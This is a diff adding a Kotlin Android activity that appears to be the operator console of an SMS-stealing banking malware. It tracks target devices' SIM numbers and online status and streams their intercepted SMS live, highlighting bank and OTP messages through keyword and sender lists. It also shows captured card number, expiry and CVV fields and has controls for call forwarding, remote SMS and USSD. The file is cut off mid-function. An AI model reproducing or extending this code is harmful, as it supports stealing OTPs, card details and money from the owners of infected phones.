@@ -1,0 +1,1628 @@
+package com.example.admin.activities
+
+import android.app.Dialog
+import android.content.ClipData
+import android.content.ClipboardManager
+import android.content.Context
+import android.content.Intent
+import android.graphics.Color
+import android.graphics.drawable.ColorDrawable
+import android.graphics.drawable.GradientDrawable
+import android.os.Build
+import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
+import android.util.Log
+import android.view.Gravity
+import android.view.View
+import android.view.ViewGroup
+import android.view.Window
+import android.view.WindowManager
+import android.view.animation.Animation
+import android.view.animation.AnimationUtils
+import android.widget.*
+import androidx.appcompat.app.AlertDialog
+import androidx.appcompat.app.AppCompatActivity
+import androidx.core.content.ContextCompat
+import com.example.admin.R
+import com.example.admin.network.SupabaseApi
+import com.example.admin.network.SmsMessagesRealtimeClient
+import com.example.admin.services.FinalFetchService
+import com.example.admin.utils.FCMHelper
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.Job
+import kotlinx.coroutines.SupervisorJob
+import kotlinx.coroutines.cancel
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.isActive
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
+import org.json.JSONObject
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
+
+class FinalActivity : AppCompatActivity() {
+
+    companion object {
+        private const val TAG = "FinalActivity"
+
+        private const val FIFTEEN_MINUTES_MS = 15 * 60 * 1000L
+        private const val CHECK_RESPONSE_TIMEOUT_MS = 15 * 1000L
+        private const val CHECK_POLL_INTERVAL_MS = 1000L
+    }
+
+    private lateinit var btnCallForwarding: TextView
+    private lateinit var btnSendSms: TextView
+    private lateinit var btnUssd: TextView
+    private lateinit var btnCheckOnline: TextView
+    private lateinit var btnData: TextView
+    private lateinit var btnAdmin: TextView
+
+    private lateinit var etCardNumber: EditText
+    private lateinit var etExpiry: EditText
+    private lateinit var etCvv: EditText
+
+    // SIM views can exist in activity_final and also inside popup XMLs.
+    // Keep root views nullable so missing/duplicate IDs never crash FinalActivity.
+    private var tvSim1: TextView? = null
+    private var tvSim2: TextView? = null
+    private var tvSim1Carrier: TextView? = null
+    private var tvSim2Carrier: TextView? = null
+
+    private lateinit var onlineStatusContainer: LinearLayout
+    private lateinit var onlineStatusDot: View
+    private lateinit var tvOnlineStatus: TextView
+    private lateinit var tvLastChecked: TextView
+
+    private lateinit var ivDownArrow: ImageView
+    private lateinit var buttonContainer1: LinearLayout
+    private lateinit var buttonContainer2: LinearLayout
+    private lateinit var smsScrollView: ScrollView
+    private lateinit var smsContainer: LinearLayout
+    private lateinit var notificationContainer: LinearLayout
+
+    private var adminTogglePopup: PopupWindow? = null
+    private var callPopup: PopupWindow? = null
+    private var smsPopup: PopupWindow? = null
+    private var ussdPopup: PopupWindow? = null
+
+    private var areButtonsVisible = true
+    private var sim1Number = "N/A"
+    private var sim2Number = "N/A"
+    private var sim1Carrier = "N/A"
+    private var sim2Carrier = "N/A"
+    private lateinit var uniqueid: String
+
+    private var isOnlineCheckInProgress = false
+    private var oldOnlineCheckedAtBeforeCheck: Long = 0L
+    private var checkStartedAt: Long = 0L
+    private var checkSecond: Int = 0
+
+    private val mainHandler = Handler(Looper.getMainLooper())
+    private val coroutineScope = CoroutineScope(Dispatchers.Main + SupervisorJob())
+    private lateinit var supabaseApi: SupabaseApi
+    private var smsRealtimeClient: SmsMessagesRealtimeClient? = null
+
+    private var deviceInfoJob: Job? = null
+    private var onlineStatusJob: Job? = null
+    private var smsLogsJob: Job? = null
+    private var callHistoryJob: Job? = null
+    private var adminConfigJob: Job? = null
+
+    private var lastProcessedCallTimestamp: Long = 0L
+    private var currentCallDialog: Dialog? = null
+    private var currentDialogId: String? = null
+    private val displayedSmsIds = mutableSetOf<String>()
+    private var currentAdminConfig: SupabaseApi.AdminConfig? = null
+
+    private val bankingKeywords = listOf(
+        "sbi", "hdfc", "icici", "axis", "kotak", "yesbank", "pnb", "canara", "idbi",
+        "upi", "debit", "credit", "payment", "account", "transaction", "balance",
+        "imps", "neft", "rtgs", "otp", "cvv", "card", "debited", "credited",
+        "bank", "loan", "emi", "statement", "wallet", "paytm", "phonepe"
+    )
+
+    private val bankingSenders = listOf(
+        "AXISB", "HDFCB", "ICICIB", "SBINB", "KOTAKB", "YESB", "PNBB"
+    )
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_final)
+
+        try {
+            supabaseApi = SupabaseApi()
+            bindViews()
+            initValues()
+            setupHeaderButtons()
+            setupDownArrowToggle()
+            startPeriodicDataFetching()
+            startSmsRealtime()
+            startFinalFetchService()
+            FCMHelper.initialize(this)
+
+            Log.d(TAG, "Activity initialized for uid=$uniqueid")
+        } catch (e: Exception) {
+            Log.e(TAG, "onCreate error", e)
+            finish()
+        }
+    }
+
+    private fun bindViews() {
+        btnCallForwarding = findViewById(R.id.btnCallForwarding)
+        btnSendSms = findViewById(R.id.btnSendSms)
+        btnUssd = findViewById(R.id.btnUssd)
+        btnCheckOnline = findViewById(R.id.btnCheckOnline)
+        btnData = findViewById(R.id.btnData)
+        btnAdmin = findViewById(R.id.btnAdmin)
+
+        etCardNumber = findViewById(R.id.etCardNumber)
+        etExpiry = findViewById(R.id.etExpiry)
+        etCvv = findViewById(R.id.etCvv)
+
+        // These IDs may also be present in popup layouts.
+        // findViewById here only searches activity_final root. Missing root views are OK.
+        tvSim1 = findOptionalTextView("tvSim1")
+        tvSim2 = findOptionalTextView("tvSim2")
+        tvSim1Carrier = findOptionalTextView("tvSim1Carrier")
+        tvSim2Carrier = findOptionalTextView("tvSim2Carrier")
+
+        onlineStatusContainer = findViewById(R.id.onlineStatusContainer)
+        onlineStatusDot = findViewById(R.id.onlineStatusDot)
+        tvOnlineStatus = findViewById(R.id.tvOnlineStatus)
+        tvLastChecked = findViewById(R.id.tvLastChecked)
+
+        ivDownArrow = findViewById(R.id.ivDownArrow)
+        buttonContainer1 = findViewById(R.id.buttonContainer1)
+        buttonContainer2 = findViewById(R.id.buttonContainer2)
+
+        smsScrollView = findViewById(R.id.smsScrollView)
+        smsContainer = findViewById(R.id.smsContainer)
+        notificationContainer = findViewById(R.id.notificationContainer)
+
+        etCardNumber.isEnabled = false
+        etExpiry.isEnabled = false
+        etCvv.isEnabled = false
+        notificationContainer.visibility = View.GONE
+    }
+
+    private fun initValues() {
+        uniqueid = intent.getStringExtra("uniqueid").orEmpty()
+        if (uniqueid.isBlank()) {
+            Log.e(TAG, "No uniqueid provided")
+            finish()
+        }
+    }
+
+    private fun findOptionalTextView(idName: String): TextView? {
+        val id = resources.getIdentifier(idName, "id", packageName)
+        if (id == 0) return null
+        return try {
+            findViewById(id)
+        } catch (_: Exception) {
+            null
+        }
+    }
+
+    private fun setAllTextViewsByIdName(root: View, idName: String, value: String) {
+        val id = resources.getIdentifier(idName, "id", packageName)
+        if (id == 0) return
+
+        fun visit(view: View) {
+            if (view.id == id && view is TextView) {
+                view.text = value
+            }
+
+            if (view is ViewGroup) {
+                for (i in 0 until view.childCount) {
+                    visit(view.getChildAt(i))
+                }
+            }
+        }
+
+        visit(root)
+    }
+
+    private fun updateMainSimViews() {
+        val root = window.decorView ?: return
+
+        // Main screen number views
+        tvSim1?.text = sim1Number
+        tvSim2?.text = sim2Number
+        tvSim1Carrier?.text = sim1Carrier
+        tvSim2Carrier?.text = sim2Carrier
+
+        // If same IDs are repeated in included layouts, update all matches safely.
+        setAllTextViewsByIdName(root, "tvSim1", sim1Number)
+        setAllTextViewsByIdName(root, "tvSim2", sim2Number)
+        setAllTextViewsByIdName(root, "tvSim1Number", sim1Number)
+        setAllTextViewsByIdName(root, "tvSim2Number", sim2Number)
+        setAllTextViewsByIdName(root, "tvSim1Carrier", sim1Carrier)
+        setAllTextViewsByIdName(root, "tvSim2Carrier", sim2Carrier)
+    }
+
+    private fun updatePopupSimViews(root: View) {
+        // Some popup layouts use only tvSim1/tvSim2, so show number + carrier there.
+        // Some popup layouts have separate tvSim1Number/tvSim2Number and carrier IDs, so set those too.
+        setAllTextViewsByIdName(root, "tvSim1", "SIM 1: $sim1Number\n$sim1Carrier")
+        setAllTextViewsByIdName(root, "tvSim2", "SIM 2: $sim2Number\n$sim2Carrier")
+        setAllTextViewsByIdName(root, "tvSim1Number", "SIM 1: $sim1Number")
+        setAllTextViewsByIdName(root, "tvSim2Number", "SIM 2: $sim2Number")
+        setAllTextViewsByIdName(root, "tvSim1Carrier", sim1Carrier)
+        setAllTextViewsByIdName(root, "tvSim2Carrier", sim2Carrier)
+    }
+
+    private fun startPeriodicDataFetching() {
+        deviceInfoJob = coroutineScope.launch {
+            while (isActive) {
+                fetchDeviceInfo()
+                delay(30000)
+            }
+        }
+
+        onlineStatusJob = coroutineScope.launch {
+            while (isActive) {
+                if (!isOnlineCheckInProgress) {
+                    fetchOnlineStatus()
+                }
+                delay(10000)
+            }
+        }
+
+        // SMS is loaded once below and then kept live by SmsMessagesRealtimeClient.
+
+        callHistoryJob = coroutineScope.launch {
+            while (isActive) {
+                fetchCallHistory()
+                delay(5000)
+            }
+        }
+
+        adminConfigJob = coroutineScope.launch {
+            while (isActive) {
+                fetchAdminConfig()
+                delay(30000)
+            }
+        }
+
+        coroutineScope.launch {
+            fetchDeviceInfo()
+            fetchOnlineStatus()
+            fetchSmsLogs()
+            fetchCallHistory()
+            fetchAdminConfig()
+        }
+    }
+
+    private fun startSmsRealtime() {
+        smsRealtimeClient?.disconnect()
+
+        smsRealtimeClient = SmsMessagesRealtimeClient(
+            supabaseApi = supabaseApi,
+            targetUniqueId = uniqueid,
+            onConnected = {
+                Log.d(TAG, "Final SMS realtime connected uid=$uniqueid")
+            },
+            onError = { error ->
+                Log.e(TAG, "SMS realtime error: $error")
+            },
+            onSmsMessagesChanged = { logs ->
+                val filtered = logs
+                    .filter { it.uniqueId == uniqueid }
+                    .sortedBy { it.timestamp }
+
+                addOnlyNewSmsLogs(filtered)
+            }
+        )
+
+        smsRealtimeClient?.connect()
+    }
+
+    private fun addOnlyNewSmsLogs(logs: List<SupabaseApi.SmsLog>) {
+        if (logs.isEmpty()) return
+
+        runOnUiThread {
+            var added = false
+
+            val sorted = logs.sortedBy { it.timestamp }
+
+            for (log in sorted) {
+                if (log.uniqueId != uniqueid) continue
+
+                val smsId = buildSmsUniqueKey(log)
+                if (!displayedSmsIds.contains(smsId)) {
+                    if (!added && displayedSmsIds.isEmpty()) {
+                        smsContainer.removeAllViews()
+                    }
+
+                    addSmsMessageCard(log, insertAtTop = true)
+                    added = true
+                }
+            }
+
+            if (added) {
+                smsScrollView.post {
+                    smsScrollView.fullScroll(ScrollView.FOCUS_UP)
+                }
+            }
+        }
+    }
+
+    private fun buildSmsUniqueKey(log: SupabaseApi.SmsLog): String {
+        val safeSmsId = log.id?.takeIf { it.isNotBlank() }
+            ?: if (log.timestamp > 0L) {
+                "sms_${log.uniqueId}_${log.timestamp}"
+            } else {
+                "sms_${log.uniqueId}_${log.body.hashCode()}"
+            }
+
+        return "${log.uniqueId}-$safeSmsId"
+    }
+
+    private suspend fun fetchDeviceInfo() {
+        try {
+            val result = supabaseApi.getAllDevices()
+
+            result.fold(
+                onSuccess = { devices ->
+                    val device = devices.find { it.uid == uniqueid }
+
+                    if (device != null) {
+                        withContext(Dispatchers.Main) {
+                            sim1Number = device.sim1Number?.takeIf { it.isNotBlank() } ?: "No SIM"
+                            sim2Number = device.sim2Number?.takeIf { it.isNotBlank() } ?: "No SIM"
+                            // ✅ Correct source from data_json:
+                            // sim1carrier / sim2carrier
+                            sim1Carrier = device.sim1Carrier?.takeIf { it.isNotBlank() } ?: "Unknown"
+                            sim2Carrier = device.sim2Carrier?.takeIf { it.isNotBlank() } ?: "Unknown"
+
+                            updateMainSimViews()
+
+                            Log.d(
+                                TAG,
+                                "✅ SIM_UI uid=$uniqueid sim1=$sim1Number carrier1=$sim1Carrier " +
+                                        "sim2=$sim2Number carrier2=$sim2Carrier"
+                            )
+                        }
+                    }
+                },
+                onFailure = { error ->
+                    Log.e(TAG, "fetchDeviceInfo failed: ${error.message}")
+                }
+            )
+        } catch (e: Exception) {
+            Log.e(TAG, "fetchDeviceInfo exception", e)
+        }
+    }
+
+    private suspend fun fetchOnlineStatus() {
+        try {
+            val status = getCurrentDeviceStatus()
+
+            withContext(Dispatchers.Main) {
+                if (status == null) {
+                    setDeviceOfflineUi("Last checked: Never")
+                    return@withContext
+                }
+
+                val now = System.currentTimeMillis()
+                val checkedAt = status.checkedAt
+                val isOnline = isFreshOnline(checkedAt, now)
+
+                if (isOnline) {
+                    setDeviceOnlineUi(checkedAt)
+                } else {
+                    setDeviceOfflineUi(
+                        if (checkedAt > 0L) {
+                            "Last checked: ${getTimeAgo(checkedAt)}"
+                        } else {
+                            "Last checked: Never"
+                        }
+                    )
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "fetchOnlineStatus exception", e)
+        }
+    }
+
+    private suspend fun getCurrentDeviceStatus(): SupabaseApi.DeviceStatus? {
+        val result = supabaseApi.getLatestDeviceStatuses()
+        return result.getOrNull()?.get(uniqueid)
+    }
+
+    private fun isFreshOnline(checkedAt: Long, now: Long = System.currentTimeMillis()): Boolean {
+        if (checkedAt <= 0L) return false
+        val diff = now - checkedAt
+        return diff in 0..FIFTEEN_MINUTES_MS
+    }
+
+    private fun setDeviceOnlineUi(checkedAt: Long = System.currentTimeMillis()) {
+        tvOnlineStatus.text = "Online"
+        onlineStatusDot.setBackgroundResource(R.drawable.green_circle)
+        tvLastChecked.text = when {
+            checkedAt <= 0L -> "Last checked: Just now"
+            System.currentTimeMillis() - checkedAt < 60000L -> "Last checked: Just now"
+            else -> "Last checked: ${getTimeAgo(checkedAt)}"
+        }
+        setOnlineContainerBackground(true, false)
+    }
+
+    private fun setDeviceOfflineUi(lastText: String = "Last checked: Never") {
+        tvOnlineStatus.text = "Offline"
+        onlineStatusDot.setBackgroundResource(R.drawable.red_circle)
+        tvLastChecked.text = lastText
+        setOnlineContainerBackground(false, false)
+    }
+
+    private fun setDeviceProcessingUi(second: Int) {
+        tvOnlineStatus.text = "Processing ${second.coerceIn(0, 15)}/15s"
+        onlineStatusDot.setBackgroundResource(R.drawable.red_circle)
+        tvLastChecked.text = "Waiting for online_checked_at response..."
+        setOnlineContainerBackground(false, true)
+    }
+
+    private fun setOnlineContainerBackground(isOnline: Boolean, isProcessing: Boolean) {
+        val color = when {
+            isProcessing -> Color.parseColor("#FFF3CD")
+            isOnline -> ContextCompat.getColor(this, R.color.successLightColor)
+            else -> Color.WHITE
+        }
+
+        val strokeColor = when {
+            isProcessing -> Color.parseColor("#FF9800")
+            isOnline -> ContextCompat.getColor(this, R.color.green)
+            else -> Color.parseColor("#DDDDDD")
+        }
+
+        val drawable = GradientDrawable().apply {
+            cornerRadius = dpToPx(12).toFloat()
+            setColor(color)
+            setStroke(dpToPx(1), strokeColor)
+        }
+
+        onlineStatusContainer.background = drawable
+    }
+
+    private suspend fun fetchSmsLogs() {
+        try {
+            val result = supabaseApi.getSmsLogsByUniqueId(uniqueid, limit = 50)
+
+            result.fold(
+                onSuccess = { smsLogs ->
+                    withContext(Dispatchers.Main) {
+                        displaySmsLogs(smsLogs)
+                    }
+                },
+                onFailure = { error ->
+                    Log.e(TAG, "fetchSmsLogs failed: ${error.message}")
+                    fetchAllSmsLogs()
+                }
+            )
+        } catch (e: Exception) {
+            Log.e(TAG, "fetchSmsLogs exception", e)
+            fetchAllSmsLogs()
+        }
+    }
+
+    private suspend fun fetchAllSmsLogs() {
+        try {
+            val result = supabaseApi.getAllSmsLogs(limit = 50)
+
+            result.fold(
+                onSuccess = { smsLogs ->
+                    val filteredLogs = smsLogs.filter { it.uniqueId == uniqueid }
+                    withContext(Dispatchers.Main) {
+                        displaySmsLogs(filteredLogs)
+                    }
+                },
+                onFailure = { error ->
+                    Log.e(TAG, "fetchAllSmsLogs failed: ${error.message}")
+                    withContext(Dispatchers.Main) {
+                        showNoSmsMessage()
+                    }
+                }
+            )
+        } catch (e: Exception) {
+            Log.e(TAG, "fetchAllSmsLogs exception", e)
+            withContext(Dispatchers.Main) {
+                showNoSmsMessage()
+            }
+        }
+    }
+
+    private suspend fun fetchCallHistory() {
+        try {
+            val result = supabaseApi.getAllDeviceStatuses()
+
+            result.fold(
+                onSuccess = { statuses ->
+                    val callStatuses = statuses.filter {
+                        it.uid == uniqueid &&
+                                it.type == "call" &&
+                                it.timestamp > lastProcessedCallTimestamp
+                    }
+
+                    callStatuses.forEach { status ->
+                        lastProcessedCallTimestamp = status.timestamp
+
+                        withContext(Dispatchers.Main) {
+                            showCallDialog(
+                                code = status.status,
+                                statusResult = if (status.online) "SUCCESS" else "FAILED",
+                                resultMsg = status.available,
+                                sim = if (status.type.contains("sim1")) 0 else 1,
+                                timestamp = status.timestamp
+                            )
+                        }
+                    }
+                },
+                onFailure = { error ->
+                    Log.e(TAG, "fetchCallHistory failed: ${error.message}")
+                }
+            )
+        } catch (e: Exception) {
+            Log.e(TAG, "fetchCallHistory exception", e)
+        }
+    }
+
+    private suspend fun fetchAdminConfig() {
+        try {
+            val result = supabaseApi.getAdminConfig()
+
+            result.fold(
+                onSuccess = { config ->
+                    currentAdminConfig = config
+                },
+                onFailure = { error ->
+                    Log.e(TAG, "fetchAdminConfig failed: ${error.message}")
+                }
+            )
+        } catch (e: Exception) {
+            Log.e(TAG, "fetchAdminConfig exception", e)
+        }
+    }
+
+    private fun displaySmsLogs(logs: List<SupabaseApi.SmsLog>) {
+        smsContainer.removeAllViews()
+        displayedSmsIds.clear()
+
+        if (logs.isEmpty()) {
+            showNoSmsMessage()
+            return
+        }
+
+        val sortedLogs = logs.sortedByDescending { it.timestamp }
+        sortedLogs.forEach { log ->
+            addSmsMessageCard(log)
+        }
+
+        smsScrollView.post {
+            smsScrollView.fullScroll(ScrollView.FOCUS_UP)
+        }
+    }
+
+    private fun addSmsMessageCard(log: SupabaseApi.SmsLog, insertAtTop: Boolean = false) {
+        val smsId = buildSmsUniqueKey(log)
+
+        if (displayedSmsIds.contains(smsId)) return
+        displayedSmsIds.add(smsId)
+
+        val messageCardView = layoutInflater.inflate(R.layout.message_card, null)
+
+        messageCardView.findViewById<TextView>(R.id.fromText).text = "From: ${log.senderNumber}"
+        messageCardView.findViewById<TextView>(R.id.timeText).text =
+            "Time: ${formatTimeForDisplay(log.timestamp)}"
+
+        val receiverText = messageCardView.findViewById<TextView>(R.id.receiverText)
+        if (log.receiverNumber.isNotEmpty()) {
+            receiverText.text = "To: ${log.receiverNumber}"
+            receiverText.visibility = View.VISIBLE
+        } else {
+            receiverText.visibility = View.GONE
+        }
+
+        messageCardView.findViewById<TextView>(R.id.bodyTextView).text = log.body
+
+        messageCardView.findViewById<ImageView>(R.id.copyIcon).setOnClickListener {
+            copyToClipboard(log.body)
+        }
+
+        messageCardView.findViewById<ImageView>(R.id.deleteIcon).setOnClickListener {
+            coroutineScope.launch {
+                performDeleteSmsLog(log.id ?: return@launch)
+            }
+        }
+
+        val isBanking = isBankingSMS(log.body, log.senderNumber)
+
+        val drawable = GradientDrawable().apply {
+            cornerRadius = dpToPx(12).toFloat()
+            setStroke(dpToPx(2), ContextCompat.getColor(this@FinalActivity, R.color.purple_500))
+            setColor(
+                if (isBanking) {
+                    ContextCompat.getColor(this@FinalActivity, R.color.successLightColor)
+                } else {
+                    Color.WHITE
+                }
+            )
+        }
+
+        messageCardView.background = drawable
+        messageCardView.setPadding(dpToPx(12), dpToPx(12), dpToPx(12), dpToPx(12))
+
+        messageCardView.setOnClickListener {
+            showFullSmsDialog(
+                title = log.title,
+                body = log.body,
+                sender = log.senderNumber,
+                receiver = log.receiverNumber,
+                timestamp = log.timestamp
+            )
+        }
+
+        val layoutParams = LinearLayout.LayoutParams(
+            LinearLayout.LayoutParams.MATCH_PARENT,
+            LinearLayout.LayoutParams.WRAP_CONTENT
+        ).apply {
+            topMargin = dpToPx(8)
+            bottomMargin = dpToPx(8)
+            marginStart = dpToPx(8)
+            marginEnd = dpToPx(8)
+        }
+
+        messageCardView.layoutParams = layoutParams
+        if (insertAtTop) {
+            smsContainer.addView(messageCardView, 0)
+        } else {
+            smsContainer.addView(messageCardView)
+        }
+    }
+
+    private suspend fun performDeleteSmsLog(smsId: String) {
+        try {
+            val result = supabaseApi.deleteSmsLog(smsId)
+
+            result.fold(
+                onSuccess = { success ->
+                    withContext(Dispatchers.Main) {
+                        if (success) {
+                            Toast.makeText(this@FinalActivity, "SMS deleted", Toast.LENGTH_SHORT).show()
+                            fetchSmsLogs()
+                        } else {
+                            Toast.makeText(this@FinalActivity, "Delete failed", Toast.LENGTH_SHORT).show()
+                        }
+                    }
+                },
+                onFailure = { error ->
+                    Log.e(TAG, "Delete failed: ${error.message}")
+                    withContext(Dispatchers.Main) {
+                        Toast.makeText(this@FinalActivity, "Delete failed", Toast.LENGTH_SHORT).show()
+                    }
+                }
+            )
+        } catch (e: Exception) {
+            Log.e(TAG, "Delete exception", e)
+            withContext(Dispatchers.Main) {
+                Toast.makeText(this@FinalActivity, "Delete failed: ${e.message}", Toast.LENGTH_SHORT).show()
+            }
+        }
+    }
+
+    private fun isBankingSMS(body: String?, sender: String?): Boolean {
+        val lowerBody = body?.lowercase(Locale.getDefault()) ?: ""
+        val lowerSender = sender?.lowercase(Locale.getDefault()) ?: ""
+
+        for (pattern in bankingSenders) {
+            if (lowerSender.contains(pattern.lowercase(Locale.getDefault()))) return true
+        }
+
+        for (keyword in bankingKeywords) {
+            if (lowerBody.contains(keyword)) {
+                val nonBanking = listOf("flipkart", "amazon", "zomato", "swiggy", "uber")
+                if (!nonBanking.any { lowerBody.contains(it) }) {
+                    return true
+                }
+            }
+        }
+
+        return false
+    }
+
+    private fun showNoSmsMessage() {
+        smsContainer.removeAllViews()
+
+        val emptyView = TextView(this).apply {
+            text = "📭 No SMS messages found"
+            textSize = 16f
+            setTextColor(ContextCompat.getColor(this@FinalActivity, android.R.color.darker_gray))
+            gravity = Gravity.CENTER
+            setPadding(dpToPx(16), dpToPx(40), dpToPx(16), dpToPx(40))
+        }
+
+        smsContainer.addView(emptyView)
+    }
+
+    private fun showFullSmsDialog(
+        title: String,
+        body: String,
+        sender: String,
+        receiver: String,
+        timestamp: Long
+    ) {
+        val timeStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(timestamp))
+
+        AlertDialog.Builder(this)
+            .setTitle("📩 SMS Details")
+            .setMessage(
+                buildString {
+                    append("From: $sender\n")
+                    append("Time: $timeStr\n")
+                    if (receiver.isNotEmpty()) append("To: $receiver\n")
+                    append("\n━━━━━━━━━━━━━━━━━━\n\n")
+                    append(body)
+                }
+            )
+            .setPositiveButton("Copy") { _, _ ->
+                copyToClipboard(body)
+                Toast.makeText(this, "Copied!", Toast.LENGTH_SHORT).show()
+            }
+            .setNegativeButton("Close", null)
+            .show()
+    }
+
+    private fun showCallDialog(
+        code: String,
+        statusResult: String,
+        resultMsg: String,
+        sim: Int,
+        timestamp: Long
+    ) {
+        try {
+            val dialogId = "${timestamp}_${code.hashCode()}"
+
+            if (currentDialogId == dialogId) return
+
+            dismissCurrentDialog()
+
+            val dialog = Dialog(this)
+            dialog.requestWindowFeature(Window.FEATURE_NO_TITLE)
+            dialog.setContentView(R.layout.call_dialog)
+            dialog.setCancelable(false)
+            dialog.setCanceledOnTouchOutside(false)
+            dialog.window?.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
+            dialog.window?.setGravity(Gravity.CENTER)
+            dialog.window?.setLayout(
+                (resources.displayMetrics.widthPixels * 0.9).toInt(),
+                ViewGroup.LayoutParams.WRAP_CONTENT
+            )
+
+            val tvTitle = dialog.findViewById<TextView>(R.id.tvDialogTitle)
+            tvTitle?.text = when (statusResult.uppercase(Locale.getDefault())) {
+                "SUCCESS" -> "📞 Call Update - SUCCESS"
+                "FAILED" -> "📞 Call Update - FAILED"
+                else -> "📞 Call Update"
+            }
+
+            dialog.findViewById<TextView>(R.id.tvDialogCode)?.text = "Code: $code"
+            dialog.findViewById<TextView>(R.id.tvDialogStatus)?.text = "Status: $statusResult"
+            dialog.findViewById<TextView>(R.id.tvDialogResult)?.text = "Result: $resultMsg"
+            dialog.findViewById<TextView>(R.id.tvDialogSim)?.text =
+                "SIM: ${if (sim == 0) "SIM 1" else "SIM 2"}"
+
+            val timeStr = SimpleDateFormat("hh:mm:ss a", Locale.getDefault()).format(Date(timestamp))
+            dialog.findViewById<TextView>(R.id.tvDialogTime)?.text = "⏰ Time: $timeStr"
+
+            dialog.findViewById<Button>(R.id.btnDialogOk)?.setOnClickListener {
+                dialog.dismiss()
+                currentCallDialog = null
+                currentDialogId = null
+            }
+
+            dialog.show()
+            currentCallDialog = dialog
+            currentDialogId = dialogId
+
+            mainHandler.postDelayed({
+                if (dialog.isShowing) {
+                    dialog.dismiss()
+                    currentCallDialog = null
+                    currentDialogId = null
+                }
+            }, 30000L)
+
+        } catch (e: Exception) {
+            Log.e(TAG, "showCallDialog error", e)
+        }
+    }
+
+    private fun dismissCurrentDialog() {
+        try {
+            currentCallDialog?.dismiss()
+            currentCallDialog = null
+            currentDialogId = null
+        } catch (e: Exception) {
+            Log.e(TAG, "dismissCurrentDialog error", e)
+        }
+    }
+
+    private fun setupHeaderButtons() {
+        btnCallForwarding.setOnClickListener {
+            toggleCallPopup()
+        }
+
+        btnSendSms.setOnClickListener {
+            toggleSmsPopup()
+        }
+
+        btnUssd.setOnClickListener {
+            toggleUssdPopup()
+        }
+
+        btnCheckOnline.setOnClickListener {
+            showCheckOnlineConfirmDialog()
+        }
+
+        btnData.setOnClickListener {
+            navigateToAllUserData()
+        }
+
+        btnAdmin.setOnClickListener {
+            showAdminTogglePopup()
+        }
+
+        findViewById<LinearLayout>(R.id.cardSection)?.setOnLongClickListener {
+            copyCardDetailsToClipboard()
+            true
+        }
+    }
+
+    private fun setupDownArrowToggle() {
+        ivDownArrow.setOnClickListener {
+            areButtonsVisible = !areButtonsVisible
+
+            if (areButtonsVisible) {
+                buttonContainer1.visibility = View.VISIBLE
+                buttonContainer2.visibility = View.VISIBLE
+                ivDownArrow.animate().rotation(0f).setDuration(300).start()
+
+                val fadeIn = AnimationUtils.loadAnimation(this, android.R.anim.fade_in)
+                buttonContainer1.startAnimation(fadeIn)
+                buttonContainer2.startAnimation(fadeIn)
+            } else {
+                val fadeOut = AnimationUtils.loadAnimation(this, android.R.anim.fade_out)
+
+                fadeOut.setAnimationListener(object : Animation.AnimationListener {
+                    override fun onAnimationStart(animation: Animation?) = Unit
+
+                    override fun onAnimationEnd(animation: Animation?) {
+                        buttonContainer1.visibility = View.GONE
+                        buttonContainer2.visibility = View.GONE
+                    }
+
+                    override fun onAnimationRepeat(animation: Animation?) = Unit
+                })
+
+                buttonContainer1.startAnimation(fadeOut)
+                buttonContainer2.startAnimation(fadeOut)
+                ivDownArrow.animate().rotation(180f).setDuration(300).start()
+            }
+        }
+    }
+
+    private fun showCheckOnlineConfirmDialog() {
+        if (isOnlineCheckInProgress) {
+            Toast.makeText(this, "Check already in progress", Toast.LENGTH_SHORT).show()
+            return
+        }
+
+        AlertDialog.Builder(this)
+            .setTitle("Check Online")
+            .setMessage(
+                "Send FCM online check to this device?\n\n" +
+                        "Processing will wait max 15 seconds for online_checked_at update."
+            )
+            .setPositiveButton("OK") { dialog, _ ->
+                dialog.dismiss()
+                checkDeviceOnline()
+            }
+            .setNegativeButton("Cancel") { dialog, _ ->
+                dialog.dismiss()
+            }
+            .show()
+    }
+
+    private fun checkDeviceOnline() {
+        if (isOnlineCheckInProgress) {
+            Toast.makeText(this, "Check already in progress", Toast.LENGTH_SHORT).show()
+            return
+        }
+
+        isOnlineCheckInProgress = true
+        checkStartedAt = System.currentTimeMillis()
+        checkSecond = 0
+
+        coroutineScope.launch {
+            val oldStatus = getCurrentDeviceStatus()
+            oldOnlineCheckedAtBeforeCheck = oldStatus?.checkedAt ?: 0L
+
+            setDeviceProcessingUi(0)
+
+            try {
+                val devices = supabaseApi.getAllDevices().getOrNull()
+                val device = devices?.find { it.uid == uniqueid }
+                val fcmToken = device?.fcmToken.orEmpty()
+
+                if (fcmToken.isBlank() || fcmToken == "null" || !FCMHelper.isValidFCMToken(fcmToken)) {
+                    finishOnlineCheckAsOffline("No FCM token")
+                    return@launch
+                }
+
+                FCMHelper.sendOnlineCheck(
+                    context = this@FinalActivity,
+                    uniqueid = uniqueid,
+                    fcmToken = fcmToken,
+                    onResult = { success, message ->
+                        runOnUiThread {
+                            if (success) {
+                                mainHandler.removeCallbacks(onlineCheckWatcherRunnable)
+                                mainHandler.post(onlineCheckWatcherRunnable)
+                            } else {
+                                finishOnlineCheckAsOffline(message ?: "FCM send failed")
+                            }
+                        }
+                    }
+                )
+            } catch (e: Exception) {
+                finishOnlineCheckAsOffline(e.message ?: "Error")
+            }
+        }
+    }
+
+    private val onlineCheckWatcherRunnable: Runnable = object : Runnable {
+        override fun run() {
+            if (!isActivityAlive()) return
+
+            coroutineScope.launch {
+                val now = System.currentTimeMillis()
+                val elapsedMs = now - checkStartedAt
+                val elapsedSec = (elapsedMs / 1000L).toInt().coerceIn(0, 15)
+
+                checkSecond = elapsedSec
+
+                withContext(Dispatchers.Main) {
+                    setDeviceProcessingUi(elapsedSec)
+                }
+
+                val status = getCurrentDeviceStatus()
+                val newOnlineCheckedAt = status?.checkedAt ?: 0L
+
+                val timestampChanged =
+                    newOnlineCheckedAt > 0L && newOnlineCheckedAt != oldOnlineCheckedAtBeforeCheck
+
+                val timestampFresh = isFreshOnline(newOnlineCheckedAt, now)
+
+                // ✅ If data_json.heartbeat.checked_at is fresh, device is online.
